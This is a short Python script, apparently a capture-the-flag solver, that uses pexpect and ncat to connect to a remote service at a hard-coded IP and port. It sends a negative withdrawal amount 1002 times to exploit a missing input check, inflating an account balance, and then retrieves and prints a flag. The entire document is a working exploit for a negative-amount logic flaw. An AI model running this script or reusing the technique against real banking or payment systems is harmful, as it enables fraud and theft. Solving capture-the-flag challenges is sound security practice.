import pexpect

def automate_withdrawal():
    child = pexpect.spawn('ncat.exe 159.223.57.20 1337')
    child.expect('Enter your choice:')
    for i in range(1002):
        print(f"Withdrawing ${-10.00}... ({i+1}/1002)")
        child.sendline('2')
        child.expect('Enter the amount to withdraw:')
        child.sendline('-10')
        child.expect('Your new balance is')
        child.expect('Enter your choice:')
    child.sendline('4')
    child.expect('Flag:')
    flag = child.after.decode('utf-8').strip()
    print(flag)
    child.sendline('5')
    child.close()

automate_withdrawal()